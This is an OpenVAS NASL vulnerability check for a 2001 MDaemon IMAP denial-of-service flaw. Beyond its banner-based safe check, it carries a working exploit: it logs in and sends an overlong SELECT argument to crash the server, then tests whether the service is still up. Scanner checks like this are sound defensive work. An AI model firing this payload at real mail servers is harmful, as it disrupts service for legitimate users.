# OpenVAS Vulnerability Test
# $Id: mdaemon_imap_server_dos2.nasl 13077 2019-01-15 10:37:47Z cfischer $
# Description: MDaemon imap server DoS(2)
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
# based on work from (C) Tenable Network Security
#
# Copyright:
# Copyright (C) 2004 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

#  Ref: <nitr0s@hotmail.com>

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14827");
  script_version("$Revision: 13077 $");
  script_tag(name:"last_modification", value:"$Date: 2019-01-15 11:37:47 +0100 (Tue, 15 Jan 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(2508);
  script_tag(name:"cvss_base", value:"2.1");
  script_tag(name:"cvss_base_vector", value:"AV:L/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2001-0584");
  script_name("MDaemon IMAP server DoS(2)");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("This script is Copyright (C) 2004 David Maciejak");
  script_family("Denial of Service");
  script_dependencies("find_service2.nasl", "logins.nasl");
  script_require_ports("Services/imap", 143);

  script_tag(name:"solution", value:"Upgrade to newest version of this software.");

  script_tag(name:"summary", value:"The remote host is running the MDaemon IMAP server.

  It is possible to crash the remote version of this software by by sending
  a too long argument to the 'SELECT' or 'EXAMINE' commands.");

  script_tag(name:"impact", value:"This problem allows an attacker to make the remote
  service crash, thus preventing legitimate users  from receiving e-mails.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_banner");

  exit(0);
}

include("imap_func.inc");

acct = get_kb_item("imap/login");
pass = get_kb_item("imap/password");
safe_checks = FALSE;

if(!acct || !pass)
  safe_checks = TRUE;

if(safe_checks())
  safe_checks = TRUE;

port = get_imap_port(default:143);

if(safe_checks) {
  banner = get_imap_banner ( port:port );
  if(!banner)
    exit(0);

  #* OK company.mail IMAP4rev1 MDaemon 3.5.6 ready
  if(ereg(pattern:".* IMAP4.* MDaemon ([0-5]\.|6\.[0-7]\.) ready", string:banner))
    security_message(port:port);
  exit(0);
}

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

banner = recv_line(socket:soc, length:4096);
if(!banner || "MDaemon" >!< banner) {
  close(soc);
  exit(0);
}

#need a valid account to test this issue
s = string("? LOGIN ", acct, " ", pass, "\r\n");
send(socket:soc, data:s);
d = recv_line(socket:soc, length:4096);

s = string("? SELECT ", crap(260), "\r\n");
send(socket:soc, data:s);
d = recv_line(socket:soc, length:4096);

close(soc);

soc2 = open_sock_tcp(port);
if(!soc2) {
  security_message(port:port);
  exit(0);
}

close(soc2);
exit(99);